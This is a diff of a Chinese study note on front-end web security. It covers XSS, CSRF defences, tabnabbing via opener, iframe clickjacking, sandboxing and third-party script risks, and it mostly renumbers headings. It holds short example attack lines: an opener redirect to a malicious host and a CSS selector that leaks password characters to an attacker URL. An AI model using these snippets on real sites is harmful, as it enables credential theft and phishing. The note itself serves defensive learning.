@@ -4,7 +4,8 @@
 > CSP的详细文档<https://cloud.tencent.com/developer/chapter/13541>
 
 ## WEB前端
-####  xss
+
+#### 1. xss
 - 定义：
     - 反射性：代码不会储存。类似`https://www.weibo?t=${xss的代码}`的链接，当t的值被当做html片段插入文档中xss代码即被执行
     - 存储性：在提交表单数据时，xss代码被保存在数据库，下次在页面上直接输出该部分内容展示时被执行
@@ -37,55 +38,55 @@
         - < 转成 &lt; > 转成 &gt; & 转成 &amp; " 转成 &quot; ' 转成 &#39
         - ? 这里需要搞明白，转义 和 escap 和 encodeURI 、encodeURIComponent的区别
 
-- csrf
-    - 定义及危害：
-        - 流程：
-            - 1.用户在A站点登录后在本域种下登录态cookie
-            - 2.访问恶意站点B，恶意站点B的某个页面向站点A发起请求，而这个请求会带上浏览器端所保存的站点A的cookie；
-            - 3.站点A根据请求所带的cookie，判断此请求为用户所发送的，站点A会报据用户的权限来处理恶意站点B所发起的请求，以此达成恶意目的。
-        - 细节：
-            - B站点在发送向A的请求时，可以是通过img等发送一个get请求，也可以通过form表单构造一个post请求
-            - 如果通过xhr发送请求(不管是get还是post)，跨域时是默认不会携带cookie的，需要设置xhr.withCredentials = true;
-            - 通过img标签，form表单发送请求，默认是携带cookie的
-    - 防御:
-        - 判断Referer
-            - Referer字段是无法再前端通过ajax设置header头来改变了的，http协议规定了[这些头](https://fetch.spec.whatwg.org/#forbidden-header-name)不能被修改
-        - 登录态通过localstorage保存，因为localstorage 不会默认携带在http请求头中，因此避免了csrf的问题
-            - 原理：登录态通过localstorage保存，每次请求时取localstorage中的登录态发送至服务端。由于localstorage没有过期时间，因此还需要自己实现一个具有过期时间的localstorage。
-            - 存在的问题：
-                - 页面不能发生XSS的攻击，否者登录态直接被泄露
-                - localstorage只能在当前域名下被读取，对于主域相同的多个不同域名，不能共享
-                - 操作略复杂，不管get/post,多需要手动携带登录态
-        - 请求加上token机制
-            - session级别的token机制：
-                - 访问页面时，在服务端的session中保存一个token，同时将token返回至前端页面html中，常见于通过一个meta标签或者 hidden 的input来保存。
-                - 发送请求时，在header或者请求参数中携带该token发送至服务端
-                - 服务端在seesion中取出对应的token 同http请求中的token进行对比来确认是否为合法请求
-            - cookie级别的token机制：
-                - 访问页面时，在服务端随机参数一个token，同时将token返回至前端页面html中，在cookie中也种下该token值
-                - 发送请求时，在header或者请求参数中携带该token发送至服务端
-                - 服务端在取出cookie中的token同 header或者参数只能的token进行对比来确认是否为合法请求
-            - 两种机制的区别：
-                - session级别的机制：
-                    - 由于Session默认存储在单机服务器内存中，因此在分布式环境下同一个用户发送的多次HTTP请求可能会先后落到不同的服务器上，导致后面发起的HTTP请求无法拿到之前的HTTP请求存储在服务器中的Session数据，从而使得Session机制在分布式环境下失效，因此在分布式集群中CSRF Token需要存储在Redis之类的公共存储空间。
-                    - 使用Session存储，读取和验证CSRF Token会引起比较大的复杂度和性能问题；
-                - cookie级别的机制：
-                    - 只需要对比http请求中的2处token是否一致即可，不会给服务器带来压力。
-                    - cookie级别的机制完全依赖于cookie，因此需要保证cookie 中的token 不能被前端修改，也不能存在xss漏洞。否者在，XSS攻击的情况下，可以随意在cookie种下一个token并泄露出去，导致这里的token机制失效。
-                    - 不依赖与session，实施起来成本低、快
-                    - 在没有设置httponly的前提下：登录态的cookie，默认是回话级别，关闭浏览器才失效，一旦遭遇XSS攻击导致token泄露，在无人工干预的情况下，token会一直有效。而session默认存在有效期，会主动让token失效。
-        - 给cookie 加上 SameSite属性: 允许服务器设置某个cookie在跨站请求时不会被发送，从而可以阻止CSRF
-            - IE10以前，IE12-15 不支持，QQ浏览器、UC浏览器不支持
-            - 几个参数：
-                - `Set-Cookie: a=1; Samesite=Strict`:严格模式，cookie 在任何情况下都不可能作为第三方 cookie，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。
-                - `Set-Cookie: a=2; Samesite=Lax`:宽松模式，假如这个请求是这种请求（改变了当前页面或者打开了新页面）且同时是个GET请求，则在请求新页面时，会携带对应域名的cookie信息，意思就是不同站点下页面跳转不会有问题。除此之外，异步请求或其他方法的页面跳转都不会携带cookie信息
-            - 这种方式需要保证get请求的幂等性，否者`Samesite=Lax`模式下，还是存在get方式的CSRF工具可能
-            - 注意点：（[如何判断是否为同一个站点](https://blog.csdn.net/qq_37060233/article/details/86595916)）
-                - 当一个请求本身的 URL 和它的发起页面的 URL 不属于同一个站点时，这个请求就算第三方请求。
-                - 这里的不同站点的判断并非直接使用的 同域、跨域的概念进行判断，而是使用 Public Suffix List 来判断,为了方便理解，暂时用同域的概率来对应Public Suffix List  判断。
-        - 使用restful形式的接口?
+#### 2. csrf
+- 定义及危害：
+    - 流程：
+        - 1.用户在A站点登录后在本域种下登录态cookie
+        - 2.访问恶意站点B，恶意站点B的某个页面向站点A发起请求，而这个请求会带上浏览器端所保存的站点A的cookie；
+        - 3.站点A根据请求所带的cookie，判断此请求为用户所发送的，站点A会报据用户的权限来处理恶意站点B所发起的请求，以此达成恶意目的。
+    - 细节：
+        - B站点在发送向A的请求时，可以是通过img等发送一个get请求，也可以通过form表单构造一个post请求
+        - 如果通过xhr发送请求(不管是get还是post)，跨域时是默认不会携带cookie的，需要设置xhr.withCredentials = true;
+        - 通过img标签，form表单发送请求，默认是携带cookie的
+- 防御:
+    - 判断Referer
+        - Referer字段是无法再前端通过ajax设置header头来改变了的，http协议规定了[这些头](https://fetch.spec.whatwg.org/#forbidden-header-name)不能被修改
+    - 登录态通过localstorage保存，因为localstorage 不会默认携带在http请求头中，因此避免了csrf的问题
+        - 原理：登录态通过localstorage保存，每次请求时取localstorage中的登录态发送至服务端。由于localstorage没有过期时间，因此还需要自己实现一个具有过期时间的localstorage。
+        - 存在的问题：
+            - 页面不能发生XSS的攻击，否者登录态直接被泄露
+            - localstorage只能在当前域名下被读取，对于主域相同的多个不同域名，不能共享
+            - 操作略复杂，不管get/post,多需要手动携带登录态
+    - 请求加上token机制
+        - session级别的token机制：
+            - 访问页面时，在服务端的session中保存一个token，同时将token返回至前端页面html中，常见于通过一个meta标签或者 hidden 的input来保存。
+            - 发送请求时，在header或者请求参数中携带该token发送至服务端
+            - 服务端在seesion中取出对应的token 同http请求中的token进行对比来确认是否为合法请求
+        - cookie级别的token机制：
+            - 访问页面时，在服务端随机参数一个token，同时将token返回至前端页面html中，在cookie中也种下该token值
+            - 发送请求时，在header或者请求参数中携带该token发送至服务端
+            - 服务端在取出cookie中的token同 header或者参数只能的token进行对比来确认是否为合法请求
+        - 两种机制的区别：
+            - session级别的机制：
+                - 由于Session默认存储在单机服务器内存中，因此在分布式环境下同一个用户发送的多次HTTP请求可能会先后落到不同的服务器上，导致后面发起的HTTP请求无法拿到之前的HTTP请求存储在服务器中的Session数据，从而使得Session机制在分布式环境下失效，因此在分布式集群中CSRF Token需要存储在Redis之类的公共存储空间。
+                - 使用Session存储，读取和验证CSRF Token会引起比较大的复杂度和性能问题；
+            - cookie级别的机制：
+                - 只需要对比http请求中的2处token是否一致即可，不会给服务器带来压力。
+                - cookie级别的机制完全依赖于cookie，因此需要保证cookie 中的token 不能被前端修改，也不能存在xss漏洞。否者在，XSS攻击的情况下，可以随意在cookie种下一个token并泄露出去，导致这里的token机制失效。
+                - 不依赖与session，实施起来成本低、快
+                - 在没有设置httponly的前提下：登录态的cookie，默认是回话级别，关闭浏览器才失效，一旦遭遇XSS攻击导致token泄露，在无人工干预的情况下，token会一直有效。而session默认存在有效期，会主动让token失效。
+    - 给cookie 加上 SameSite属性: 允许服务器设置某个cookie在跨站请求时不会被发送，从而可以阻止CSRF
+        - IE10以前，IE12-15 不支持，QQ浏览器、UC浏览器不支持
+        - 几个参数：
+            - `Set-Cookie: a=1; Samesite=Strict`:严格模式，cookie 在任何情况下都不可能作为第三方 cookie，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。
+            - `Set-Cookie: a=2; Samesite=Lax`:宽松模式，假如这个请求是这种请求（改变了当前页面或者打开了新页面）且同时是个GET请求，则在请求新页面时，会携带对应域名的cookie信息，意思就是不同站点下页面跳转不会有问题。除此之外，异步请求或其他方法的页面跳转都不会携带cookie信息
+        - 这种方式需要保证get请求的幂等性，否者`Samesite=Lax`模式下，还是存在get方式的CSRF工具可能
+        - 注意点：（[如何判断是否为同一个站点](https://blog.csdn.net/qq_37060233/article/details/86595916)）
+            - 当一个请求本身的 URL 和它的发起页面的 URL 不属于同一个站点时，这个请求就算第三方请求。
+            - 这里的不同站点的判断并非直接使用的 同域、跨域的概念进行判断，而是使用 Public Suffix List 来判断,为了方便理解，暂时用同域的概率来对应Public Suffix List  判断。
+    - 使用restful形式的接口?
 
-#### a标签跳转时 opener.location.href劫持
+#### 3. a标签跳转时 opener.location.href劫持
 - 定义：当带有target="_blank"的a标签打开的新标签页面，在新标签页中可以通过`window.opener.location.href = 'https://www.hack.com'`能将原页面跳转到恶意页面
 - 解决办法：
     - 1.在 a 标签的 rel 属性中指定 rel="noopener",这种方法IE上基本不支持
@@ -96,7 +97,7 @@
     - 通过设置rel="noopener"，可以避免这种性能问题。
     - 原文：`Linking to another page using target="_blank" will run the new page on the same process as your page. If the new page is executing expensive JS, your page's performance may suffer. To avoid this use rel=noopener.`
 
-#### iframe 被恶意嵌套问题
+#### 4. iframe 被恶意嵌套问题
 - 定义: 这定义就比较明确了，恶意站点www.hack.com 通过iframe嵌入你的站点www.hehe.com
 - 危害:
     - 仍然是点击劫持，恶意站点在iframe上覆盖一个透明的a标签，然后点击引导到恶意站点，用户认为是一个安全的站点跳转过来，因此很可能信任新的页面
@@ -126,7 +127,7 @@
 
 > 普通跨域的情况，iframe 是获取不到 `top.location.href`，但是可以设置`top.location.href`。
 
-#### iframe 沙箱
+#### 5. iframe 沙箱
 
 - 定义：sandbox就是用来给指定iframe设置一个沙盒模型，限制iframe 嵌入页面的权限。（IE10才开始支持）。基本用法就是`<iframe sandbox="xx" src="xxx"></iframe>`
 - iframe sandbox几个值的情况
@@ -144,7 +145,7 @@
     - allow-popups:允许iframe中弹出新窗口,比如,window.open,target="_blank"
     - allow-pointer-lock:在iframe中可以锁定鼠标，主要和鼠标锁定有关（没太懂这个含义）
 
-#### 第三方资源js本身存在安全问题
+#### 6. 第三方资源js本身存在安全问题
 - 定义：
     - 通过cdn加载的第三方js存在 问题代码
     - 通过npm 安装的js组件存在问题代码，或者组件后续升级时，加入了问题代码，基本上作者的npm 或 github账号被盗后，就容易出现这种问题
@@ -156,7 +157,7 @@
     - 2.不要通过cdn的方式挂在第三方资源，建议保存在本地项目中在进行挂载
     - 3.对于需要npm install 安装的第三方库，应该明确指定版本或者通过`package-lock.json`锁定一个具体的版本
 
-#### 第三方css偷取密码问题
+#### 7. 第三方css偷取密码问题
 
 > [这篇文章](http://blog.minfive.com/2018/02/23/2018-02-23-css-hacker/)讲的相当详细了
 
@@ -192,12 +193,12 @@ input[type="password"][value$="6"] { background-image: url("http://www.hacker.co
 /*后面省略value$="各种字符"的css*/
 ```
 
-#### 302跳转劫持问题
+#### 8. 302跳转劫持问题
 
-- cdn劫持
-- 可执行文件上传漏洞
+#### 9. cdn劫持
+#### 10. 可执行文件上传漏洞
 
-#### http明文传输本身存在问题
+#### 11. http明文传输本身存在问题
 
 **到底如何不安全了？**
 
@@ -219,10 +220,10 @@ input[type="password"][value$="6"] { background-image: url("http://www.hacker.co
             - `<object>`
 
 
-#### web前端针对 法律法规存在的文案问题
+#### 12. web前端针对 法律法规存在的文案问题
 这个不用多说，如果对广告法缺乏基本的认知，很可能出现法律安全方面的问题，比如国家目前是禁止`第一、最大、最全`这类的广告宣传；其次就是当地政策的不了解导致的安全问题，比如将 TW，HK归为国家类，这都是严重错误的情况。技术上无法完全规避这类文案问题，只能不断加强 文案安全合规的的意识。
 
-- 公开的信息被恶意批量爬取，比如有效资源，联系电话：见https://www.dianping.com/shop/57504830
+#### 13. 公开的信息被恶意批量爬取，比如有效资源，联系电话：见https://www.dianping.com/shop/57504830
 
 
 ## 后端
